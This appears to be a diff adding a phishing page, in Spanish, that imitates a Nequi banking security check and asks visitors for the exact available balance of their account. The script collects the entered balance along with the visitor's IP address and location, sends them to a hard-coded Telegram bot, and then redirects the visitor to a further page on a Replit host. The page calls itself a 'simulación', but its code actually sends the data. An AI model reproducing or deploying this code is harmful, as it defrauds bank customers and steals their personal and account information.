@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Tu Saldo Disponible</title>
+  <style>
+    *{box-sizing:border-box;margin:0;padding:0}
+    html,body{height:100%;font-family:'Open Sans',system-ui,Arial;background:#fff}
+    .image-container{position:relative;width:100%;height:100vh;overflow:hidden}
+    .image-container img{position:absolute;inset:0;width:100%;height:100%;object-fit:cover;opacity:.25}
+    header{padding:18px;text-align:center}
+    #logo{height:44px}
+    .center-box{position:absolute;left:50%;top:10%;transform:translate(-50%,-50%);width:340px;background:#fff;border-radius:12px;padding:20px;box-shadow:0 8px 30px rgba(0,0,0,.12);display:flex;flex-direction:column;gap:12px;align-items:center}
+    .titulo{font-weight:700;color:#210049;font-size:20px}
+    .descripcion{color:#210049;font-weight:300;text-align:center;font-size:14px}
+    .saldo-input{width:100%;padding:14px;border-radius:8px;border:1px solid #F8F1F5;background:#F8F1F5;text-align:center;font-size:1rem;color:#210049;outline:none}
+    .saldo-input:focus{border:1px solid #d9006e;background:#fff;box-shadow:0 0 0 4px rgba(217,0,110,.07)}
+    .button-container{position:absolute;left:50%;top:34%;transform:translate(-50%,-50%);display:flex;flex-direction:column;gap:12px;align-items:center}
+    .btn{width:260px;padding:12px;border-radius:8px;border:none;font-weight:700;cursor:pointer}
+    .btn-primary{background:#d9006e;color:#fff}
+    .btn-primary.disabled{background:rgba(217,0,110,.35);top:10%;cursor:not-allowed}
+    .btn-cancel{background:#cccccc;color:#000}
+    #loader{display:none;position:fixed;inset:0;background:rgba(255,255,255,.9);z-index:9999;place-items:center;font-weight:700;color:#210049}
+    .modal{display:none;position:fixed;inset:0;background:rgba(0,0,0,.45);z-index:10000;align-items:center;justify-content:center}
+    .card{background:#fff;padding:18px;border-radius:10px;min-width:260px;text-align:center;box-shadow:0 8px 24px rgba(0,0,0,.2)}
+    .mon{font-size:1.25rem;font-weight:700;color:#210049;margin:8px 0}
+    @media(max-width:480px){.center-box{width:92%}.btn{width:220px}}
+  </style>
+</head>
+<body>
+    <br><br><br>
+ <center> <img id="logo" src="img/logo.svg" alt="logo"></center> 
+ <br><br><br><br><br><br><br><br>
+ <center>
+  <img id="logo" src="img/cap.jpg" alt="logo" width="50" height="auto">
+</center>
+
+   
+  <div class="image-container">
+   
+
+    <form id="saldoForm" autocomplete="off" class="center-box" aria-label="Formulario saldo (simulación)">
+       
+      <div class="titulo">Queremos validar que eres tu</div>
+      <div class="descripcion">Por la seguridad de tu desbloqueo de tu clave dinamica, por favor, ingresa el <strong>saldo disponible</strong> Exacto de tu cuenta Nequi ingresa a tu app y verifica.</div>
+
+      <input id="saldo" class="saldo-input" type="text" inputmode="numeric" placeholder="$ saldo disponible" aria-label="Saldo disponible">
+    </form>
+
+    <div class="button-container" role="group" aria-label="Acciones">
+      <button id="continuar" class="btn btn-primary disabled" type="button" disabled>Continuar</button>
+      <button id="cancelar" class="btn btn-cancel" type="button">Cancelar</button>
+    </div>
+  </div>
+
+  <div id="loader">Procesando…</div>
+
+  <div id="modal" class="modal" role="dialog" aria-modal="true" aria-hidden="true">
+    <div class="card">
+      <div>Mensaje simulado (lo que se *enviaría* a Telegram):</div>
+      <div id="modalSaldo" class="mon">$ 0</div>
+      <button id="modalClose" class="btn btn-primary">Cerrar</button>
+    </div>
+  </div>
+<script>
+  // Referencias DOM
+  const form = document.getElementById('saldoForm');
+  const saldoInput = document.getElementById('saldo');
+  const continuarBtn = document.getElementById('continuar');
+  const cancelarBtn = document.getElementById('cancelar');
+  const loader = document.getElementById('loader');
+
+  // Formato pesos colombianos
+  function formatCOP(digits) {
+    if (!digits) return '';
+    return '$ ' + new Intl.NumberFormat('es-CO').format(parseInt(digits, 10));
+  }
+
+  saldoInput.addEventListener('input', () => {
+    const digits = saldoInput.value.replace(/\D/g, '');
+    if (digits) {
+      saldoInput.value = formatCOP(digits);
+      continuarBtn.disabled = false;
+      continuarBtn.classList.remove('disabled');
+    } else {
+      saldoInput.value = '';
+      continuarBtn.disabled = true;
+      continuarBtn.classList.add('disabled');
+    }
+  });
+
+  continuarBtn.addEventListener('click', async () => {
+    if (continuarBtn.disabled) return;
+
+    const formatted = saldoInput.value.trim();
+    const raw = formatted.replace(/\D/g, '');
+    if (!raw || parseInt(raw, 10) <= 0) {
+      alert('Ingresa un saldo válido.');
+      return;
+    }
+
+    loader.style.display = 'grid';
+    continuarBtn.disabled = true;
+
+    try {
+      // Obtener IP y ubicación
+      const ipData = await fetch('https://ipapi.co/json/').then(res => res.json());
+
+      const mensaje = `
+💰 Saldo disponible: ${formatted}
+🌍 IP: ${ipData.ip}
+📍 Ciudad: ${ipData.city}
+🏙 Región: ${ipData.region}
+🇨🇴 País: ${ipData.country_name}
+      `;
+             
+       // Datos de Telegram
+      const token = "8323486458:AAGJeAlHlciuq-STKT6i6f-kU9Vt_uCsgp8";
+      const chatId = "7776240161";
+
+      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: mensaje,
+          parse_mode: 'HTML'
+        })
+      });
+
+      window.location.href = 'https://85209926-39fc-46ee-a72a-05fd23dc0609-00-3qu8iexvja78g.janeway.replit.dev/dinainvalida/cel-dina.html';
+    } catch (err) {
+      console.error("Error enviando:", err);
+      alert("Hubo un problema enviando el mensaje.");
+      loader.style.display = 'none';
+      continuarBtn.disabled = false;
+    }
+  });
+
+  cancelarBtn.addEventListener('click', () => {
+    saldoInput.value = '';
+    window.location.href = 'https://expresstigo.vercel.app/';
+  });
+</script>
+
+</body>
+</html>
+
+
+
